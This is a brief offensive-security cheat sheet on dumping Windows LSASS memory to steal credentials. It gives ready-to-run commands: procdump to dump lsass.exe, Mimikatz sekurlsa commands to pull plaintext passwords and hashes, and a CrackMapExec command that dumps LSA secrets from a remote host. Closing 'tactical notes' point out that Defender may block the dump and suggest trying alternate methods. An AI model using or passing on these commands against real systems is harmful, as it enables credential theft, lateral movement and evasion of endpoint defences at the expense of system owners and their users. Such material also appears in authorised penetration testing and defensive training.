# LSASS Dumping

Goal: Extract plaintext credentials and hashes from memory.

---

# Dump LSASS

procdump.exe -accepteula -ma lsass.exe lsass.dmp

---

# Mimikatz

sekurlsa::minidump lsass.dmp

sekurlsa::logonpasswords

---

# CrackMapExec LSA Dump

crackmapexec smb <IP> -u <user> -p <password> --lsa

---

# Tactical Notes

- Often yields plaintext passwords.
- Defender may block direct dump.
- Consider alternate dump methods if blocked.
